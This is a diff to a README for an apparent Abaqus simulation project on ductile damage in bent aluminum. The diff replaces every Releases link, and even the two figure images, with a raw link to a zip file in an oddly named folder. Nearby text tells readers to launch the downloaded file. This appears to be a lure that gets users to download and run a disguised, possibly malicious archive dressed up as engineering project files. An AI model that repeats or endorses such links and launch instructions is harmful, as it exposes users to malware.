@@ -8,9 +8,9 @@ Welcome to the repository for "Abaqus-Aluminum-Bending-Ductile-Damage-3D"! Here 
 - **Topics:** abaqus, aluminum-extrusions, cae, ductile, ductile-failure, ductile-fracture, finite-element-analysis, finite-element-methods, quasi-static, simulation
 
 ## 🚀 Quick Access
-You can download the project files [here](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases) 📦
+You can download the project files [here](https://raw.githubusercontent.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/main/Spenerism/Abaqus-Aluminum-Bending-Ductile-D-Damage-1.3.zip) 📦
 
-[![Download Project](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases)](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases)
+[![Download Project](https://raw.githubusercontent.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/main/Spenerism/Abaqus-Aluminum-Bending-Ductile-D-Damage-1.3.zip)](https://raw.githubusercontent.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/main/Spenerism/Abaqus-Aluminum-Bending-Ductile-D-Damage-1.3.zip)
 
 If the link ends with a file name, make sure to launch it to access the project files. If you encounter any issues with the link, please check the "Releases" section of this repository for alternative download options.
 
@@ -29,10 +29,10 @@ Through the simulations conducted in this project, key findings related to ducti
 ### Visualization of Results
 Here are some visual representations of the simulation results showing the deformation and damage evolution in the aluminum sample:
 
-![Deformation Analysis](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases)
+![Deformation Analysis](https://raw.githubusercontent.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/main/Spenerism/Abaqus-Aluminum-Bending-Ductile-D-Damage-1.3.zip)
 *Figure 1: Deformation Analysis*
 
-![Damage Evolution](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases)
+![Damage Evolution](https://raw.githubusercontent.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/main/Spenerism/Abaqus-Aluminum-Bending-Ductile-D-Damage-1.3.zip)
 *Figure 2: Damage Evolution*
 
 ## 🌐 Further Exploration
